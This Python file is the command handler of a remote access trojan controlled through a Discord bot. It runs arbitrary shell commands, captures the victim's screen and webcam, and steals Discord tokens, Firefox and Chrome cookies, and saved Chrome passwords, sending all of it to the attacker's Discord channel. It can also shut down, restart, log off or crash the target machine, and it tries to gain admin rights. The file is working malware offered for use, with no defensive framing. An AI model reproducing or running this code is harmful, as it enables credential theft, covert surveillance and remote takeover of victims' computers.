from subprocess import run
import discord
import os
import sys

from LOADER import *
from UTILS import *
from STEALERS import STEALERS
from OSINT import OSINT
from KILLERS import KILLERS

client = discord.Client()
steal = STEALERS()
osint = OSINT()
killers = KILLERS()


if AdminRights is True and is_user_admin() is False:
    run_as(sys.argv[0])

if Messagebox is True:
    SendMessageBox(TheMessage)

@client.event
async def on_ready():
    print('Logged on as', client.user)
    channel = client.get_channel(DiscordChannelID)
    print(channel)
    info = osint.run()
    embedVar = discord.Embed(title="LOADED!", description=info, color=0x00ff00)
    await channel.send(embed=embedVar)
@client.event
async def on_message(message):
    if client.user == message.author: pass
    c = message.content.split(' ')
    if c[0] == '/help':
        await message.channel.send(help_command())
    if c[0] == '/cmd':
        if c[1]:
            cmd = long_run_shell(c[1])
        for _ in cmd:
            await message.channel.send(_)
    if c[0] == '/screen':
        the_png = os.getenv("TEMP") + "\\a.png"
        osint.take_screenshot(the_png)
        await message.channel.send(file=discord.File(the_png))
    if c[0] == '/webcam':
        img = os.getenv("TEMP") + "\\image.bmp"
        if os.path.exists(img):
            os.remove(img)
        osint.take_webcam_snapshot('g.exe')
        if os.path.exists(img) == True:
            img = copy_file(img, os.getenv("TEMP") + "\\image.png")
            if os.path.exists(img) == True:
                await message.channel.send(file=discord.File(img))
        if os.path.exists(img) == False:
            await message.channel.send("NO WEBCAM FOUND")
        if os.path.exists(img):
            os.remove(img)
        if os.path.exists(img):
            os.remove(img)
    if c[0] == '/cleantmp':
        cleaner = long_run_shell('rd /s /q %TMP%')
        await message.channel.send("Cleaned Temp Directory")
    if c[0] == '/discord':
        tokenz = steal.discord_tokens()
        await message.channel.send("```" + tokenz + "```")
    if c[0] == '/firefoxc':
        f_cookies = steal.firefox_cookies()
        if f_cookies == False:
            await message.channel.send("NO COOKIE FILE FOUND")
        else:
            await message.channel.send(file=discord.File(f_cookies))
    if c[0] == '/chromec':
        ch_cookies = steal.chrome_cookies()
        if ch_cookies == False:
            await message.channel.send("NO COOKIE FILE FOUND")
        else:
            await message.channel.send(file=discord.File(ch_cookies))
    if c[0] == '/chrome':
        chrome_pwds = steal.chrome_passwords()
        if os.path.exists(chrome_pwds) == True:
            await message.channel.send(file=discord.File(chrome_pwds))
        elif os.path.exists(chrome_pwds) == False:
            await message.channel.send("FAILED TO AQUIRE PASSWORD FILE!")
    if c[0] == '/shutdown':
        await message.channel.send("Shutting down target..")
        killers.shutdown_pc()
    if c[0] == '/restart':
        await message.channel.send("Restarting target..")
        killers.restart_pc()
    if c[0] == '/logoff':
        await message.channel.send("Logging off target..")
        killers.logoff_pc()
    if c[0] == '/bsod':
        await message.channel.send("Sending BSOD..")
        killers.bsod_screen()
    if c[0] == '/syskill':
        syskill = c[1]
client.run(DiscordToken)